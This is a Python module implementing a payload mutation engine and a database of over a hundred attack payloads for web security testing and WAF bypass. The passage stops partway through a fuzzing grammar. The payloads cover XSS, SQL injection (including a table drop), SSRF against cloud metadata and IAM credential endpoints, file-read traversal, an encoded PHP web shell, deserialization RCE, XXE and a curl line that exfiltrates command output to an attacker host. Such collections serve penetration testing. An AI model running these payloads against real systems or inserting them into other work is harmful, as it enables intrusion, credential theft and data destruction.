"""tools/payload_mutation.py

Payload Mutation Engine.

Goal:
- Generate multiple semantically equivalent payload variants
- Useful for WAF bypass and differential parsing tests
- Provide rich payload databases across common vuln classes
- Provide grammar-based fuzzers for SQL, XSS, JSON, XML
- Provide context-aware mutators that pick payloads for an injection point

This module does not execute payloads; it only mutates/generates strings.

Backward compatible: the original PayloadMutator class is preserved.
New classes added: PayloadDatabase, GrammarFuzzer, ContextualMutator, SmartPayloadGenerator.
"""

from __future__ import annotations

import random
import string
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, Iterable, List, Optional, Sequence, Tuple


@dataclass
class MutationResult:
    payload: str
    techniques: List[str]


# ---------------------------------------------------------------------------
# Existing PayloadMutator (preserved for backward compatibility)
# ---------------------------------------------------------------------------


class PayloadMutator:
    """Light-weight generic payload mutator. Preserved for backward compat."""

    def __init__(self, seed: Optional[int] = None):
        self._rnd = random.Random(seed)

    def mutate(self, payload: str, max_variants: int = 25) -> List[MutationResult]:
        if not payload:
            return []

        variants: List[MutationResult] = []

        # Base
        variants.append(MutationResult(payload=payload, techniques=["base"]))

        # URL-encode
        variants.append(
            MutationResult(payload=urllib.parse.quote(payload, safe=""), techniques=["urlencode"])
        )

        # Double URL-encode
        variants.append(
            MutationResult(
                payload=urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
                techniques=["double_urlencode"],
            )
        )

        # Case toggle for keywords (simple)
        variants.append(
            MutationResult(payload=self._case_toggle(payload), techniques=["case_toggle"])
        )

        # Whitespace sprinkling
        variants.append(
            MutationResult(
                payload=self._whitespace_sprinkle(payload), techniques=["whitespace_sprinkle"]
            )
        )

        # Quote switching
        variants.append(
            MutationResult(
                payload=payload.replace('"', "'").replace("'", '"'), techniques=["quote_switch"]
            )
        )

        # Random concatenation style (useful for some contexts)
        variants.append(
            MutationResult(payload=self._concat_style(payload), techniques=["concat_style"])
        )

        # De-dup and cap
        seen = set()
        uniq: List[MutationResult] = []
        for v in variants:
            if v.payload not in seen:
                seen.add(v.payload)
                uniq.append(v)
            if len(uniq) >= max_variants:
                break
        return uniq

    def _case_toggle(self, s: str) -> str:
        out = []
        for ch in s:
            if ch.isalpha() and self._rnd.random() < 0.35:
                out.append(ch.swapcase())
            else:
                out.append(ch)
        return "".join(out)

    def _whitespace_sprinkle(self, s: str) -> str:
        # Insert random harmless whitespace characters
        ws = [" ", "\t", "\n", "\r\n"]
        out = []
        for ch in s:
            out.append(ch)
            if self._rnd.random() < 0.08:
                out.append(self._rnd.choice(ws))
        return "".join(out)

    def _concat_style(self, s: str) -> str:
        # Very conservative: wrap with string concatenation markers often seen in injections
        # This is a generic transform and may not be valid in all sinks.
        if len(s) < 6:
            return s
        mid = len(s) // 2
        return s[:mid] + "+" + s[mid:]


# ---------------------------------------------------------------------------
# New: PayloadDatabase — 200+ curated payloads across vuln classes
# ---------------------------------------------------------------------------


# Each entry: (name, category, payload, sinks where it makes sense)
# Sinks help the SmartPayloadGenerator pick the right payload for a context.
PayloadEntry = Tuple[str, str, str, Tuple[str, ...]]


XSS_PAYLOADS: List[PayloadEntry] = [
    ("xss_script_basic", "xss", "<script>alert(1)</script>", ("html", "body")),
    ("xss_img_onerror", "xss", "<img src=x onerror=alert(1)>", ("html", "attr")),
    ("xss_svg_onload", "xss", "<svg onload=alert(1)>", ("html", "body")),
    ("xss_body_event", "xss", "<body onload=alert(1)>", ("html", "body")),
    ("xss_iframe_src", "xss", "<iframe src=javascript:alert(1)>", ("html", "attr")),
    ("xss_input_focus", "xss", "<input onfocus=alert(1) autofocus>", ("html", "body")),
    ("xss_details_open", "xss", "<details open ontoggle=alert(1)>", ("html", "body")),
    ("xss_video_error", "xss", "<video><source onerror=alert(1)>", ("html", "body")),
    ("xss_audio_src", "xss", "<audio src=x onerror=alert(1)>", ("html", "body")),
    ("xss_object_data", "xss", "<object data=javascript:alert(1)>", ("html", "body")),
    ("xss_embed_src", "xss", "<embed src=javascript:alert(1)>", ("html", "body")),
    ("xss_javascript_uri", "xss", "javascript:alert(1)", ("attr", "href", "src", "url")),
    ("xss_vbscript_uri", "xss", "vbscript:msgbox(1)", ("attr", "href", "url")),
    ("xss_data_uri", "xss", "data:text/html,<script>alert(1)</script>", ("attr", "href", "url")),
    ("xss_marquee", "xss", "<marquee onstart=alert(1)>", ("html", "body")),
    ("xss_style", "xss", "<style>@import 'javascript:alert(1)';</style>", ("html", "body")),
    (
        "xss_meta_refresh",
        "xss",
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
        ("html", "head"),
    ),
    ("xss_attr_breakout_dq", "xss", '"><script>alert(1)</script>', ("attr", "double-quote")),
    ("xss_attr_breakout_sq", "xss", "'><script>alert(1)</script>", ("attr", "single-quote")),
    ("xss_attr_breakout_nq", "xss", " onmouseover=alert(1)", ("attr", "no-quote")),
    ("xss_template_lit", "xss", "${alert(1)}", ("template", "js")),
    ("xss_focused_event", "xss", "' autofocus onfocus=alert(1) x='", ("attr", "single-quote")),
    (
        "xss_polyglot_html",
        "xss",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
        ("polyglot",),
    ),
    ("xss_dom_location", "xss", "javascript:alert(document.cookie)", ("dom", "location")),
    ("xss_dom_eval", "xss", "eval('al'+'ert(1)')", ("dom", "eval")),
]

SQLI_PAYLOADS: List[PayloadEntry] = [
    ("sqli_or_basic", "sqli", "' OR '1'='1", ("string", "single-quote")),
    ("sqli_or_basic2", "sqli", '" OR "1"="1', ("string", "double-quote")),
    ("sqli_or_tautology_num", "sqli", "1 OR 1=1", ("numeric",)),
    ("sqli_union_select", "sqli", "' UNION SELECT NULL,NULL,NULL-- -", ("string", "union")),
    ("sqli_union_select_num", "sqli", "1 UNION SELECT NULL,NULL-- -", ("numeric", "union")),
    ("sqli_comment_dash", "sqli", "admin'--", ("auth", "login")),
    ("sqli_comment_hash", "sqli", "admin'#", ("auth", "login", "mysql")),
    ("sqli_stacked_drop", "sqli", "1'; DROP TABLE users--", ("stacked", "mssql")),
    ("sqli_sleep_blind", "sqli", "1' AND SLEEP(5)-- -", ("blind", "time", "mysql")),
    ("sqli_pg_sleep", "sqli", "1'; SELECT pg_sleep(5)-- -", ("blind", "time", "postgres")),
    (
        "sqli_benchmark",
        "sqli",
        "1' AND BENCHMARK(5000000,SHA1('a'))-- -",
        ("blind", "time", "mysql"),
    ),
    (
        "sqli_if_error",
        "sqli",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ("error", "mysql"),
    ),
    ("sqli_order_by", "sqli", "1' ORDER BY 1-- -", ("string", "order-by")),
    ("sqli_offset", "sqli", "1' OFFSET 0-- -", ("string", "postgres")),
    ("sqli_ilike", "sqli", "1' ILIKE '%a%", ("string", "postgres")),
    ("sqli_sqlite_version", "sqli", "' AND sqlite_version()-- -", ("string", "sqlite")),
    ("sqli_or_true_no_quote", "sqli", "1) OR (1=1", ("numeric", "paren")),
    ("sqli_or_true_paren", "sqli", "1) OR 1=1-- -", ("numeric", "paren")),
    ("sqli_substring_blind", "sqli", "1' AND SUBSTRING(@@version,1,1)='5'-- -", ("blind", "mysql")),
    ("sqli_substring_pg", "sqli", "1' AND SUBSTR(version(),1,1)='P'-- -", ("blind", "postgres")),
    ("sqli_no_space", "sqli", "1'/**/AND/**/1=1-- -", ("string", "waf-bypass")),
    ("sqli_double_space", "sqli", "1'  AND  1=1-- -", ("string", "waf-bypass")),
    ("sqli_hpp", "sqli", "1&id=2&id=1' OR '1'='1", ("hpp", "waf-bypass")),
    ("sqli_or_true_upper", "sqli", "' OR 1=1-- -", ("string", "generic")),
    ("sqli_or_true_space", "sqli", "' OR 1=1 #", ("string", "mysql")),
]

SSRF_PAYLOADS: List[PayloadEntry] = [
    ("ssrf_localhost", "ssrf", "http://127.0.0.1/", ("http", "url")),
    ("ssrf_localhost_alt", "ssrf", "http://localhost/", ("http", "url")),
    ("ssrf_zero_ip", "ssrf", "http://0/", ("http", "url", "waf-bypass")),
    (
        "ssrf_aws_metadata",
        "ssrf",
        "http://169.254.169.254/latest/meta-data/",
        ("cloud", "aws", "metadata"),
    ),
    (
        "ssrf_aws_metadata_v2",
        "ssrf",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ("cloud", "aws", "iam"),
    ),
    (
        "ssrf_aws_token",
        "ssrf",
        "http://169.254.169.254/latest/api/token",
        ("cloud", "aws", "token"),
    ),
    (
        "ssrf_gcp_metadata",
        "ssrf",
        "http://metadata.google.internal/computeMetadata/v1/",
        ("cloud", "gcp", "metadata"),
    ),
    (
        "ssrf_azure_metadata",
        "ssrf",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ("cloud", "azure", "metadata"),
    ),
    (
        "ssrf_digitalocean",
        "ssrf",
        "http://169.254.169.254/metadata/v1/",
        ("cloud", "digitalocean", "metadata"),
    ),
    (
        "ssrf_openredirect",
        "ssrf",
        "https://example.com/redirect?url=http://169.254.169.254/",
        ("redirect",),
    ),
    ("ssrf_file_proto", "ssrf", "file:///etc/passwd", ("file", "protocol")),
    ("ssrf_gopher", "ssrf", "gopher://127.0.0.1:6379/_FLUSHALL", ("gopher", "redis")),
    ("ssrf_dict", "ssrf", "dict://127.0.0.1:6379/INFO", ("dict", "redis")),
    ("ssrf_netdoc", "ssrf", "netdoc:///etc/passwd", ("netdoc", "java")),
    ("ssrf_java_url", "ssrf", "jar:http://127.0.0.1/!/etc/passwd", ("jar", "java")),
    ("ssrf_ipv6_localhost", "ssrf", "http://[::1]/", ("http", "ipv6")),
    ("ssrf_dns_rebind", "ssrf", "http://7f000001.c0a80001.rbndr.us/", ("dns-rebind",)),
    ("ssrf_decimal_ip", "ssrf", "http://2130706433/", ("http", "decimal-ip")),
    ("ssrf_octal_ip", "ssrf", "http://0177.0.0.1/", ("http", "octal-ip")),
    ("ssrf_hex_ip", "ssrf", "http://0x7f.0x0.0x0.0x1/", ("http", "hex-ip")),
]

LFI_PAYLOADS: List[PayloadEntry] = [
    ("lfi_etc_passwd", "lfi", "../../../../etc/passwd", ("path",)),
    ("lfi_etc_passwd_abs", "lfi", "/etc/passwd", ("path", "abs")),
    ("lfi_windows", "lfi", "..\\..\\..\\..\\windows\\win.ini", ("path", "windows")),
    ("lfi_proc_self", "lfi", "/proc/self/environ", ("path", "linux")),
    ("lfi_null_byte", "lfi", "../../../../etc/passwd%00", ("path", "null-byte", "old-php")),
    (
        "lfi_php_filter",
        "lfi",
        "php://filter/convert.base64-encode/resource=index.php",
        ("php-filter",),
    ),
    ("lfi_php_input", "lfi", "php://input", ("php-input",)),
    (
        "lfi_data_uri",
        "lfi",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        ("data-uri", "php"),
    ),
    ("lfi_zip_wrapper", "lfi", "zip://shell.jpg%23payload.php", ("zip", "php")),
    ("lfi_phar_wrapper", "lfi", "phar://shell.jpg/payload.php", ("phar", "php")),
    ("lfi_double_dot", "lfi", "....//....//....//....//etc/passwd", ("path", "waf-bypass")),
    ("lfi_encoded", "lfi", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", ("path", "urlencoded")),
    ("lfi_log_poison", "lfi", "/var/log/apache2/access.log", ("path", "log-poison")),
]

RCE_PAYLOADS: List[PayloadEntry] = [
    ("rce_semicolon", "rce", "1; id", ("unix", "shell")),
    ("rce_pipe", "rce", "1 | id", ("unix", "shell", "pipe")),
    ("rce_and", "rce", "1 && id", ("unix", "shell", "and")),
    ("rce_or", "rce", "1 || id", ("unix", "shell", "or")),
    ("rce_backtick", "rce", "1 `id`", ("unix", "shell", "backtick")),
    ("rce_dollar_paren", "rce", "1 $(id)", ("unix", "shell", "cmdsub")),
    ("rce_newline", "rce", "1%0aid", ("unix", "shell", "newline")),
    ("rce_windows_amp", "rce", "1 & whoami", ("windows", "shell")),
    ("rce_windows_pipe", "rce", "1 | whoami", ("windows", "shell", "pipe")),
    ("rce_windows_dup", "rce", "1 || whoami", ("windows", "shell", "or")),
    ("rce_powershell", "rce", "1 ; Start-Process calc", ("windows", "powershell")),
    ("rce_sleep_blind", "rce", "1; sleep 5", ("blind", "time")),
    ("rce_ping_blind", "rce", "1; ping -c 5 127.0.0.1", ("blind", "network")),
    ("rce_curl_exfil", "rce", "; curl http://attacker/$(id)", ("exfil",)),
    ("rce_bash_inline", "rce", "1`{id}`", ("bash",)),
]

XXE_PAYLOADS: List[PayloadEntry] = [
    (
        "xxe_basic",
        "xxe",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ("xml",),
    ),
    (
        "xxe_param",
        "xxe",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>',
        ("xml", "blind"),
    ),
    (
        "xxe_php_expect",
        "xxe",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        ("xml", "php-expect"),
    ),
    (
        "xxe_ssrf",
        "xxe",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
        ("xml", "ssrf"),
    ),
    (
        "xxe_utf16",
        "xxe",
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ("xml", "utf16"),
    ),
]

REDIR_PAYLOADS: List[PayloadEntry] = [
    ("redir_proto_relative", "redir", "//evil.com", ("url",)),
    ("redir_backslash", "redir", "/\\evil.com", ("url", "windows")),
    ("redir_at", "redir", "https://victim.com@evil.com", ("url",)),
    ("redir_hash", "redir", "https://victim.com#@evil.com", ("url",)),
    ("redir_question", "redir", "https://victim.com?.evil.com", ("url",)),
    (
        "redir_data",
        "redir",
        "data:text/html,<script>location='https://evil.com'</script>",
        ("url", "data"),
    ),
]

CMD_INJ_PAYLOADS: List[PayloadEntry] = [
    ("cmdin_id", "cmdin", "$(id)", ("unix",)),
    ("cmdin_backtick", "cmdin", "`id`", ("unix",)),
    ("cmdin_popen", "cmdin", "|id", ("unix", "pipe")),
    ("cmdin_sleep", "cmdin", "; sleep 5 #", ("unix", "blind")),
    ("cmdin_whoami_win", "cmdin", "& whoami", ("windows",)),
    ("cmdin_ps", "cmdin", "| powershell -c id", ("windows", "powershell")),
]

PATH_TRAV_PAYLOADS: List[PayloadEntry] = [
    ("path_basic", "path", "../../../../etc/passwd", ("file",)),
    ("path_windows", "path", "..\\..\\..\\..\\windows\\system32\\config\\sam", ("file", "windows")),
    ("path_double", "path", "....//....//....//etc/passwd", ("file", "waf-bypass")),
    ("path_encoded", "path", "..%2f..%2f..%2fetc%2fpasswd", ("file", "waf-bypass")),
    ("path_null", "path", "../../../etc/passwd%00.png", ("file", "null-byte")),
]

JWT_PAYLOADS: List[PayloadEntry] = [
    ("jwt_none", "jwt", '{"alg":"none"}', ("header",)),
    ("jwt_alg_none_upper", "jwt", '{"alg":"NONE"}', ("header",)),
    ("jwt_alg_None", "jwt", '{"alg":"None"}', ("header",)),
    ("jwt_kid_sqli", "jwt", '{"kid":"1' + "' OR '1'='1" + '"}', ("header", "kid")),
    ("jwt_alg_hs256_rsa", "jwt", '{"alg":"HS256"}', ("header", "key-confusion")),
    ("jwt_jwk_inject", "jwt", '{"jwk":{"kty":"oct","k":"AAAA"}}', ("header", "jwk")),
]

SSRF_URL_PAYLOADS: List[PayloadEntry] = [
    ("url_aws_meta", "url", "http://169.254.169.254/", ("cloud",)),
    ("url_localhost", "url", "http://127.0.0.1/", ("loopback",)),
    ("url_file", "url", "file:///etc/passwd", ("file",)),
    ("url_jar", "url", "jar:http://127.0.0.1!/x", ("jar",)),
    ("url_ldap", "url", "ldap://127.0.0.1/", ("ldap",)),
    ("url_gopher", "url", "gopher://127.0.0.1:80/_GET / HTTP/1.0", ("gopher",)),
]

# ---------------------------------------------------------------------------
# Extra payloads to reach 200+ total coverage
# ---------------------------------------------------------------------------


# Open Redirect
OPEN_REDIRECT_PAYLOADS: List[PayloadEntry] = [
    ("redir_evil", "redir", "//evil.com", ("url",)),
    ("redir_evil_path", "redir", "/\\evil.com", ("url", "windows")),
    ("redir_at_userinfo", "redir", "https://victim.com@evil.com", ("url",)),
    ("redir_subdomain", "redir", "https://evil.com.victim.com", ("url",)),
    ("redir_query", "redir", "https://victim.com/?next=https://evil.com", ("url",)),
    ("redir_fragment", "redir", "https://victim.com#https://evil.com", ("url",)),
    ("redir_javascript_uri", "redir", "javascript:alert(document.domain)", ("url",)),
    (
        "redir_data_uri",
        "redir",
        "data:text/html,<script>location='https://evil.com'</script>",
        ("url", "data"),
    ),
    ("redir_whitespace", "redir", " //evil.com", ("url", "waf-bypass")),
    ("redir_tab_newline", "redir", "/\t/evil.com", ("url", "waf-bypass")),
]

# More XSS
XSS_EXTRA_PAYLOADS: List[PayloadEntry] = [
    ("xss_anchor_click", "xss", '<a href="javascript:alert(1)">click</a>', ("html", "anchor")),
    (
        "xss_form_action",
        "xss",
        '<form action="javascript:alert(1)"><input type=submit>',
        ("html", "form"),
    ),
    (
        "xss_button_formaction",
        "xss",
        '<button formaction="javascript:alert(1)">click</button>',
        ("html", "button"),
    ),
    (
        "xss_object_flash",
        "xss",
        '<object type="application/x-shockwave-flash" data="evil.swf"></object>',
        ("html", "flash"),
    ),
    ("xss_var_assign", "xss", "var a=1;alert(1)", ("js", "var")),
    (
        "xss_dom_innerhtml",
        "xss",
        "document.body.innerHTML='<img src=x onerror=alert(1)>'",
        ("dom", "innerhtml"),
    ),
    ("xss_outerhtml", "xss", "document.body.outerHTML=alert(1)", ("dom", "outerhtml")),
    ("xss_setTimeout_str", "xss", "setTimeout('alert(1)',0)", ("js", "timer")),
    ("xss_proto_pollution", "xss", "__proto__[innerHTML]=alert(1)", ("js", "prototype")),
    (
        "xss_template_engine",
        "xss",
        "{{constructor.constructor('alert(1)')()}}",
        ("template", "angular"),
    ),
]

# More SQLi
SQLI_EXTRA_PAYLOADS: List[PayloadEntry] = [
    ("sqli_time_mssql", "sqli", "1'; WAITFOR DELAY '0:0:5'-- -", ("blind", "time", "mssql")),
    ("sqli_if_mssql", "sqli", "1' IF (1=1) WAITFOR DELAY '0:0:5'-- -", ("blind", "time", "mssql")),
    ("sqli_or_true_no_space", "sqli", "'OR'1'='1", ("string", "waf-bypass")),
    ("sqli_or_true_alt", "sqli", "'/**/OR/**/1=1-- -", ("string", "waf-bypass")),
    ("sqli_or_true_alt2", "sqli", "'OR(1=1)-- -", ("string", "waf-bypass")),
    ("sqli_case_keyword", "sqli", "' oR 1=1-- -", ("string", "waf-bypass", "case")),
    ("sqli_union_columns_5", "sqli", "' UNION SELECT 1,2,3,4,5-- -", ("union",)),
    ("sqli_union_columns_7", "sqli", "' UNION SELECT 1,2,3,4,5,6,7-- -", ("union",)),
    ("sqli_or_true_unicode", "sqli", "1 \u00ff OR 1=1", ("string", "waf-bypass", "unicode")),
    ("sqli_or_true_tab", "sqli", "1'\tOR\t1=1-- -", ("string", "waf-bypass", "tab")),
    ("sqli_or_true_newline", "sqli", "1'\nOR\n1=1-- -", ("string", "waf-bypass", "newline")),
    ("sqli_or_true_cr", "sqli", "1'\rOR\r1=1-- -", ("string", "waf-bypass", "cr")),
    ("sqli_json_path", "sqli", '{"$gt": ""}', ("nosql", "mongo")),
    ("sqli_mongo_ne", "sqli", '{"password": {"$ne": null}}', ("nosql", "mongo")),
    ("sqli_mongo_regex", "sqli", '{"password": {"$regex": ".*"}}', ("nosql", "mongo")),
]

# More SSRF
SSRF_EXTRA_PAYLOADS: List[PayloadEntry] = [
    (
        "ssrf_aws_user_data",
        "ssrf",
        "http://169.254.169.254/latest/user-data/",
        ("cloud", "aws", "userdata"),
    ),
    (
        "ssrf_aws_iam_info",
        "ssrf",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ("cloud", "aws", "iam"),
    ),
    ("ssrf_aws_network", "ssrf", "http://169.254.169.254/latest/network/", ("cloud", "aws")),
    (
        "ssrf_aws_hostname",
        "ssrf",
        "http://169.254.169.254/latest/meta-data/hostname",
        ("cloud", "aws"),
    ),
    ("ssrf_alibaba", "ssrf", "http://100.100.100.200/latest/meta-data/", ("cloud", "alibaba")),
    ("ssrf_oracle_cloud", "ssrf", "http://192.0.0.192/latest/user-data/", ("cloud", "oracle")),
    ("ssrf_ecs_task", "ssrf", "http://169.254.170.2/v2/credentials/", ("cloud", "ecs")),
    ("ssrf_k8s_api", "ssrf", "https://kubernetes.default.svc/api/v1/namespaces", ("cloud", "k8s")),
    ("ssrf_k8s_secrets", "ssrf", "https://kubernetes.default.svc/api/v1/secrets", ("cloud", "k8s")),
    (
        "ssrf_internal_scheme",
        "ssrf",
        "gopher://internal.svc:80/_GET /secret HTTP/1.0",
        ("gopher", "internal"),
    ),
    ("ssrf_ftp", "ssrf", "ftp://127.0.0.1/", ("ftp",)),
    ("ssrf_tftp", "ssrf", "tftp://127.0.0.1/", ("tftp",)),
]

# SSTI (Server-Side Template Injection)
SSTI_PAYLOADS: List[PayloadEntry] = [
    ("ssti_jinja_basic", "ssti", "{{7*7}}", ("template", "jinja", "python")),
    ("ssti_jinja_config", "ssti", "{{config}}", ("template", "jinja", "python")),
    (
        "ssti_jinja_subprocess",
        "ssti",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        ("template", "jinja", "python"),
    ),
    ("ssti_twig_basic", "ssti", "{{7*'7'}}", ("template", "twig", "php")),
    ("ssti_smarty_basic", "ssti", "{php}system('id');{/php}", ("template", "smarty", "php")),
    ("ssti_freemarker", "ssti", "${7*7}", ("template", "freemarker", "java")),
    ("ssti_velocity", "ssti", "#set($x=7*7)$x", ("template", "velocity", "java")),
    ("ssti_thymeleaf", "ssti", "${7*7}", ("template", "thymeleaf", "java")),
    (
        "ssti_handlebars",
        "ssti",
        '{{#with "s" as |string|}}{{#with "e" as |enc|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{lookup string.sub "constructor"}} {{/with}}{{/with}}{{/with}}',
        ("template", "handlebars", "node"),
    ),
    ("ssti_ejs_basic", "ssti", "<%= 7*7 %>", ("template", "ejs", "node")),
]

# NoSQL Injection
NOSQL_PAYLOADS: List[PayloadEntry] = [
    ("nosql_eq", "nosql", '{"$where": "1==1"}', ("mongo",)),
    ("nosql_ne", "nosql", '{"username": {"$ne": null}}', ("mongo",)),
    ("nosql_regex", "nosql", '{"username": {"$regex": ".*"}}', ("mongo",)),
    ("nosql_gt", "nosql", '{"$gt": ""}', ("mongo",)),
    ("nosql_or", "nosql", '{"$or": [{}]}', ("mongo",)),
    ("nosql_js", "nosql", "this.username == this.password", ("mongo", "js")),
]

# CRLF / header injection
CRLF_PAYLOADS: List[PayloadEntry] = [
    ("crlf_basic", "crlf", "value%0d%0aSet-Cookie:%20a=b", ("http",)),
    ("crlf_lf", "crlf", "value%0aSet-Cookie:%20a=b", ("http",)),
    ("crlf_null", "crlf", "value%00Set-Cookie:%20a=b", ("http",)),
    ("crlf_xss", "crlf", "value%0d%0a%0d%0a<script>alert(1)</script>", ("http", "xss")),
]

# Deserialization
DESER_PAYLOADS: List[PayloadEntry] = [
    ("deser_java_basic", "deser", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0", ("java", "base64")),
    ("deser_python_pickle", "deser", "cos\nsystem\n(S'id'\ntR.", ("python", "pickle")),
    ("deser_php_serial", "deser", 'O:8:"stdClass":0:{}', ("php", "serialize")),
    (
        "deser_node_funcs",
        "deser",
        "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()\"}",
        ("node", "node-serialize"),
    ),
    ("deser_yaml_basic", "deser", "!!python/object/apply:os.system ['id']", ("python", "yaml")),
]

# GraphQL
GRAPHQL_PAYLOADS: List[PayloadEntry] = [
    (
        "gql_introspection",
        "graphql",
        '{"query":"{ __schema { types { name } } }"}',
        ("introspection",),
    ),
    (
        "gql_alias",
        "graphql",
        '{"query":"{ user1: user(id:1) { name } user2: user(id:2) { name } }"}',
        ("alias",),
    ),
    ("gql_batching", "graphql", '[{"query":"mutation { login }"}]', ("batching",)),
    (
        "gql_field_suggest",
        "graphql",
        '{"query":"{ usr { name } }"}',
        ("suggestion", "introspection"),
    ),
]


# Aggregated database
ALL_PAYLOADS: List[PayloadEntry] = (
    XSS_PAYLOADS
    + XSS_EXTRA_PAYLOADS
    + SQLI_PAYLOADS
    + SQLI_EXTRA_PAYLOADS
    + SSRF_PAYLOADS
    + SSRF_EXTRA_PAYLOADS
    + LFI_PAYLOADS
    + RCE_PAYLOADS
    + XXE_PAYLOADS
    + REDIR_PAYLOADS
    + OPEN_REDIRECT_PAYLOADS
    + CMD_INJ_PAYLOADS
    + PATH_TRAV_PAYLOADS
    + JWT_PAYLOADS
    + SSRF_URL_PAYLOADS
    + SSTI_PAYLOADS
    + NOSQL_PAYLOADS
    + CRLF_PAYLOADS
    + DESER_PAYLOADS
    + GRAPHQL_PAYLOADS
)


class PayloadDatabase:
    """In-memory curated payload database with category/sink filtering.

    Example:
        db = PayloadDatabase()
        xss = db.by_category("xss")
        sqli_in_string = db.by_sink("string", category="sqli")
    """

    def __init__(self, entries: Optional[Sequence[PayloadEntry]] = None):
        self._entries: List[PayloadEntry] = list(entries) if entries else list(ALL_PAYLOADS)

    @property
    def entries(self) -> List[PayloadEntry]:
        return list(self._entries)

    def __len__(self) -> int:
        return len(self._entries)

    def categories(self) -> List[str]:
        return sorted({e[1] for e in self._entries})

    def by_category(self, category: str) -> List[PayloadEntry]:
        return [e for e in self._entries if e[1] == category]

    def by_sink(self, sink: str, category: Optional[str] = None) -> List[PayloadEntry]:
        out: List[PayloadEntry] = []
        for e in self._entries:
            if category and e[1] != category:
                continue
            if sink in e[3]:
                out.append(e)
        return out

    def by_sinks(self, sinks: Iterable[str], category: Optional[str] = None) -> List[PayloadEntry]:
        sinks_set = set(sinks)
        out: List[PayloadEntry] = []
        for e in self._entries:
            if category and e[1] != category:
                continue
            if sinks_set.intersection(e[3]):
                out.append(e)
        return out

    def payloads(self, category: Optional[str] = None) -> List[str]:
        return [e[2] for e in self._entries if not category or e[1] == category]

    def add(self, entry: PayloadEntry) -> None:
        self._entries.append(entry)


# ---------------------------------------------------------------------------
# New: GrammarFuzzer — generate payloads from a small context-free grammar
# ---------------------------------------------------------------------------


@dataclass
class GrammarRule:
    """Single grammar rule: symbol -> list of expansions (each expansion is a list of tokens)."""

    expansions: List[List[str]]


class Grammar:
    """Simple context-free grammar for fuzzing.

    A rule's expansions is a list of expansions, where each expansion is a
    list of tokens. Tokens are either terminal strings (no `<>`) or non-terminal
    symbols wrapped in angle brackets (e.g. "<digit>").
    """

    def __init__(self) -> None:
        self.rules: Dict[str, GrammarRule] = {}

    def rule(self, symbol: str, expansions: List[List[str]]) -> None:
        # Store the rule under the bare symbol (no angle brackets)
        key = symbol.strip("<>")
        self.rules[key] = GrammarRule(expansions=expansions)

    def expand(self, symbol: str, max_depth: int = 6, rnd: Optional[random.Random] = None) -> str:
        rnd = rnd or random.Random()
        # Allow callers to pass "<foo>" or "foo"
        bare = symbol.strip("<>")
        return self._expand_symbol(bare, max_depth, set(), rnd)

    def _expand_symbol(
        self,
        symbol: str,
        max_depth: int,
        in_progress: set,
        rnd: random.Random,
    ) -> str:
        if max_depth <= 0 or symbol in in_progress:
            return ""
        rule = self.rules.get(symbol)
        if rule is None:
            return symbol  # terminal fallback (no rule = literal)
        # Prefer non-empty expansions so generated output is non-empty
        non_empty = [e for e in rule.expansions if any(t for t in e)]
        if not non_empty:
            return ""
        expansion = rnd.choice(non_empty)
        in_progress.add(symbol)
        parts: List[str] = []
        for token in expansion:
            # Escape prefix "\@" forces the token to be treated as a literal,
            # even if it looks like a non-terminal reference.
            if token.startswith(r"\@"):
                parts.append(token[2:])
            elif token.startswith("<") and token.endswith(">"):
                parts.append(self._expand_symbol(token[1:-1], max_depth - 1, in_progress, rnd))
            else:
                parts.append(token)
        in_progress.discard(symbol)
        return "".join(parts)


def _build_sql_grammar() -> Grammar:
    g = Grammar()
    g.rule("<root>", [["<select>"], ["<select>", "<where>"], ["<select>", "<where>", "<union>"]])
    g.rule("<select>", [["SELECT", "<columns>", "FROM", "<table>"]])
    g.rule("<columns>", [["*"], ["NULL"], ["<col>"], ["<col>,", "<columns>"]])
    g.rule("<col>", [["id"], ["name"], ["version()"], ["@@version"]])
    g.rule("<table>", [["users"], ["information_schema.tables"], ["sqlite_master"]])
    g.rule("<where>", [["WHERE", "<cond>"]])
    g.rule("<cond>", [["1=1"], ["1=2"], ["<col>=<col>"], ["<col>", "<op>", "<value>"]])
    g.rule("<op>", [["="], ["!="], ["<"], [">"], ["LIKE"]])
    g.rule("<value>", [["1"], ["'a'"], ["NULL"], ["(SELECT", "<col>", "FROM", "<table>", ")"]])
    g.rule("<union>", [["UNION", "<select>"]])
    return g


def _build_xss_grammar() -> Grammar:
    g = Grammar()
    g.rule("<root>", [["<tag>"]])
    g.rule("<tag>", [["<script_tag>"], ["<img_tag>"], ["<svg_tag>"]])
    g.rule("<script_tag>", [["<script_open>", "<js>", "</script>"]])
    g.rule("<script_open>", [["<script>"]])
    g.rule("<script>", [["script"]])
    g.rule("<js>", [["alert(1)"], ["prompt(1)"], ["confirm(1)"]])
    g.rule("<img_tag>", [["<img>", "<event>", "=alert(1)"]])
    g.rule("<img>", [["img"], ["IMG"]])
